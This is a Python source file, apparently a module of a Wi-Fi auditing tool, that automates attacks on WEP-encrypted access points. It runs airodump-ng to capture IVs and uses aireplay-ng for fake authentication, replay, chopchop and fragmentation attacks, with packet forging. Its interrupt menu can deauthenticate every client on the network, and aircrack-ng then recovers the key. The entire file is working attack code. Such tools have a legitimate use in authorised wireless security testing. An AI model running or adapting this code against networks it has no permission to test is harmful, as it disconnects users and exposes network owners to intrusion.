#!/usr/bin/python2.7
# -*- coding: utf-8 -*-

from Attack import Attack
from Airodump import Airodump
from Aireplay import Aireplay, WEPAttackType
from Aircrack import Aircrack
from Configuration import Configuration
from Interface import Interface
from Color import Color
from CrackResultWEP import CrackResultWEP

import time

class AttackWEP(Attack):
    '''
        Contains logic for attacking a WEP-encrypted access point.
    '''

    fakeauth_wait = 5

    def __init__(self, target):
        super(AttackWEP, self).__init__(target)
        self.crack_result = None
        self.success = False

    def run(self):
        '''
            Initiates full WEP attack.
            Including airodump-ng starting, cracking, etc.
            Returns: True if attack is succesful, false otherwise
        '''

        aircrack = None # Aircrack process, not started yet
        fakeauth_proc = None
        replay_file = None

        attacks_remaining = list(Configuration.wep_attacks)
        while len(attacks_remaining) > 0:
            attack_name = attacks_remaining.pop(0)
            # BIG try-catch to capture ctrl+c
            try:
                # Start Airodump process
                with Airodump(channel=self.target.channel,
                              target_bssid=self.target.bssid,
                              ivs_only=True, # Only capture IVs packets
                              skip_wash=True, # Don't check for WPS-compatibility
                              output_file_prefix='wep') as airodump:

                    Color.clear_line()
                    Color.p('\r{+} {O}waiting{W} for target to appear...')
                    airodump_target = self.wait_for_target(airodump)

                    fakeauth_proc = None
                    if self.fake_auth():
                        # We successfully authenticated!
                        # Use our interface's MAC address for the attacks.
                        client_mac = Interface.get_mac()
                        # Keep us authenticated
                        fakeauth_proc = Aireplay(self.target, "fakeauth")
                    elif len(airodump_target.clients) == 0:
                        # Failed to fakeauth, can't use our MAC.
                        # And there are no associated clients. Use one and tell the user.
                        Color.pl('{!} {O}there are no associated clients{W}')
                        Color.pl('{!} {R}WARNING: {O}many attacks will not succeed' +
                                 ' without fake-authentication or associated clients{W}')
                        client_mac = None
                    else:
                        # Fakeauth failed, but we can re-use an existing client
                        client_mac = airodump_target.clients[0].station

                    # Convert to WEPAttackType.
                    wep_attack_type = WEPAttackType(attack_name)

                    # Start Aireplay process.
                    aireplay = Aireplay(self.target,
                                        wep_attack_type,
                                        client_mac=client_mac)

                    time_unchanged_ivs = time.time() # Timestamp when IVs last changed
                    previous_ivs = 0

                    # Loop until attack completes.

                    while True:
                        airodump_target = self.wait_for_target(airodump)
                        status = "%d/{C}%d{W} IVs" % (airodump_target.ivs, Configuration.wep_crack_at_ivs)
                        if fakeauth_proc:
                            if fakeauth_proc and fakeauth_proc.status:
                                status += ", {G}fakeauth{W}"
                            else:
                                status += ", {R}no-auth{W}"
                        if aireplay.status is not None:
                            status += ", %s" % aireplay.status
                        Color.clear_entire_line()
                        Color.pattack("WEP",
                                airodump_target,
                                "%s attack" % attack_name,
                                status)

                        #self.aircrack_check()

                        # Check if we cracked it.
                        if aircrack and aircrack.is_cracked():
                            (hex_key, ascii_key) = aircrack.get_key_hex_ascii()
                            bssid = airodump_target.bssid
                            if airodump_target.essid_known:
                                essid = airodump_target.essid
                            else:
                                essid = None
                            Color.pl('\n{+} {C}%s{W} WEP attack {G}successful{W}\n'
                                % attack_name)
                            if aireplay: aireplay.stop()
                            if fakeauth_proc: fakeauth_proc.stop()
                            self.crack_result = CrackResultWEP(self.target.bssid,
                                    self.target.essid, hex_key, ascii_key)
                            self.crack_result.dump()
                            self.success = True
                            return self.success

                        if aircrack and aircrack.is_running():
                            # Aircrack is running in the background.
                            Color.p("and {C}cracking{W}")

                        # Check number of IVs, crack if necessary
                        if airodump_target.ivs > Configuration.wep_crack_at_ivs:
                            if not aircrack:
                                # Aircrack hasn't started yet. Start it.
                                ivs_file = airodump.find_files(endswith='.ivs')[0]
                                aircrack = Aircrack(ivs_file)

                            elif not aircrack.is_running():
                                # Aircrack stopped running.
                                Color.pl('\n{!} {O}aircrack stopped running!{W}')
                                ivs_file = airodump.find_files(endswith='.ivs')[0]
                                Color.pl('{+} {C}aircrack{W} stopped, restarting...')
                                self.fake_auth()
                                aircrack = Aircrack(ivs_file)

                            elif Configuration.wep_restart_aircrack > 0 and \
                                    aircrack.pid.running_time() > Configuration.wep_restart_aircrack:
                                # Restart aircrack after X seconds
                                aircrack.stop()
                                ivs_file = airodump.find_files(endswith='.ivs')[0]
                                Color.pl('\n{+} {C}aircrack{W} ran for more than' +
                                         ' {C}%d{W} seconds, restarting'
                                             % Configuration.wep_restart_aircrack)
                                aircrack = Aircrack(ivs_file)


                        if not aireplay.is_running():
                            # Some Aireplay attacks loop infinitely
                            if attack_name == 'chopchop' or attack_name == 'fragment':
                                # We expect these to stop once a .xor is created, or if the process failed.

                                replay_file = None

                                # Check for .xor file.
                                xor_file = Aireplay.get_xor()
                                if not xor_file:
                                    # If .xor is not there, the process failed.
                                    Color.pl('\n{!} {O}%s attack{R} did not generate' % attack_name +
                                             ' a .xor file{W}')
                                    # XXX: For debugging
                                    Color.pl('{?} {O}Command: {R}%s{W}' % aireplay.cmd)
                                    Color.pl('{?} {O}Output:\n{R}%s{W}' % aireplay.get_output())
                                    break

                                # If .xor exists, run packetforge-ng to create .cap
                                Color.pl('\n{+} {C}%s attack{W}' % attack_name +
                                        ' generated a {C}.xor file{W}, {G}forging...{W}')
                                replay_file = Aireplay.forge_packet(xor_file,
                                                                   airodump_target.bssid,
                                                                   client_mac)
                                if replay_file:
                                    Color.pl('{+} {C}forged packet{W},' +
                                             ' {G}replaying...{W}')
                                    wep_attack_type = WEPAttackType("forgedreplay")
                                    attack_name = "forgedreplay"
                                    aireplay = Aireplay(self.target,
                                                        'forgedreplay',
                                                        client_mac=client_mac,
                                                        replay_file=replay_file)
                                    continue
                                else:
                                    # Failed to forge packet. drop out
                                    break
                            else:
                                Color.pl('\n{!} {O}aireplay-ng exited unexpectedly{W}')
                                Color.pl('{?} {O}Command: {R}%s{W}' % aireplay.cmd)
                                Color.pl('{?} {O}Output:\n%s{W}' % aireplay.get_output())
                                break # Continue to other attacks

                        # Check if IVs stopped flowing (same for > N seconds)
                        if airodump_target.ivs > previous_ivs:
                            time_unchanged_ivs = time.time()
                        elif Configuration.wep_restart_stale_ivs > 0 and \
                             attack_name != 'chopchop' and \
                             attack_name != 'fragment':
                            stale_seconds = time.time() - time_unchanged_ivs
                            if stale_seconds > Configuration.wep_restart_stale_ivs:
                                # No new IVs within threshold, restart aireplay
                                aireplay.stop()
                                Color.pl('\n{!} restarting {C}aireplay{W} after' +
                                         ' {C}%d{W} seconds of no new IVs'
                                             % stale_seconds)
                                aireplay = Aireplay(self.target, \
                                                    wep_attack_type, \
                                                    client_mac=client_mac, \
                                                    replay_file=replay_file)
                                time_unchanged_ivs = time.time()
                        previous_ivs = airodump_target.ivs

                        time.sleep(1)
                        continue
                    # End of big while loop
                # End of with-airodump
            except KeyboardInterrupt:
                if fakeauth_proc: fakeauth_proc.stop()
                if len(attacks_remaining) == 0:
                    self.success = False
                    return self.success
                if self.user_wants_to_stop(attack_name, attacks_remaining, airodump_target):
                    self.success = False
                    return self.success
            except Exception as e:
                Color.pl("\n{+} {R}Error: {O}%s{W}" % e)
                continue
            # End of big try-catch
        # End of for-each-attack-type loop

        self.success = False
        return self.success

    def user_wants_to_stop(self, current_attack, attacks_remaining, target):
        '''
            Ask user what attack to perform next (re-orders attacks_remaining, returns False),
            or if we should stop attacking this target (returns True).
        '''
        target_name = target.essid if target.essid_known else target.bssid

        Color.pl("\n\n{!} {O}Interrupted")
        Color.pl("{+} {W}Next steps:")

        # Deauth clients & retry
        attack_index = 1
        Color.pl("     {G}1{W}: {O}Deauth clients{W} and {G}retry{W} {C}%s attack{W} against {G}%s{W}" % (current_attack, target_name))

        # Move onto a different WEP attack
        for attack_name in attacks_remaining:
            attack_index += 1
            Color.pl("     {G}%d{W}: Start new {C}%s attack{W} against {G}%s{W}" % (attack_index, attack_name, target_name))

        # Stop attacking entirely
        attack_index += 1
        Color.pl("     {G}%d{W}: {R}Stop attacking, {O}Move onto next target{W}" % attack_index)
        while True:
            answer = raw_input(Color.s("{?} Select an option ({G}1-%d{W}): " % attack_index))
            if not answer.isdigit() or int(answer) < 1 or int(answer) > attack_index:
                Color.pl("{!} {R}Invalid input: {O}Must enter a number between {G}1-%d{W}" % attack_index)
                continue
            answer = int(answer)
            break

        if answer == 1:
            # Deauth clients & retry
            deauth_count = 1
            Color.clear_entire_line()
            Color.p("\r{+} {O}Deauthenticating *broadcast*{W} (all clients)...")
            Aireplay.deauth(target.bssid, essid=target.essid)
            for client in target.clients:
                Color.clear_entire_line()
                Color.p("\r{+} {O}Deauthenticating client {C}%s{W}..." % client.station)
                Aireplay.deauth(target.bssid, client_mac=client.station, essid=target.essid)
                deauth_count += 1
            Color.clear_entire_line()
            Color.pl("\r{+} Sent {C}%d {O}deauths{W}" % deauth_count)
            # Re-insert current attack to top of list of attacks remaining
            attacks_remaining.insert(0, current_attack)
            return False # Don't stop
        elif answer == attack_index:
            return True # Stop attacking
        elif answer > 1:
            # User selected specific attack: Re-order attacks based on desired next-step
            attacks_remaining.insert(0, attacks_remaining.pop(answer-2))
            return False # Don't stop

    def fake_auth(self):
        '''
            Attempts to fake-authenticate with target.
            Returns: True if successful,
                     False is unsuccesful.
        '''
        Color.p('\r{+} attempting {G}fake-authentication{W} with {C}%s{W}...' % self.target.bssid)
        fakeauth = Aireplay.fakeauth(self.target, timeout=AttackWEP.fakeauth_wait)
        if fakeauth:
            Color.pl(' {G}success{W}')
        else:
            Color.pl(' {R}failed{W}')
            if Configuration.require_fakeauth:
                # Fakeauth is requried, fail
                raise Exception(
                    'Fake-authenticate did not complete within' +
                    ' %d seconds' % AttackWEP.fakeauth_wait)
            else:
                # Warn that fakeauth failed
                Color.pl('{!} {O}' +
                    'unable to fake-authenticate with target' +
                    ' (%s){W}' % self.target.bssid)
                Color.pl('{!} continuing attacks because' +
                    ' {G}--require-fakeauth{W} was not set')
        return fakeauth



if __name__ == '__main__':
    from Target import Target
    fields = "A4:2B:8C:16:6B:3A, 2015-05-27 19:28:44, 2015-05-27 19:28:46,  6,  54e,WEP, WEP, , -58,        2,        0,   0.  0.  0.  0,   9, Test Router Please Ignore, ".split(',')
    target = Target(fields)
    wep = AttackWEP(target)
    wep.run()

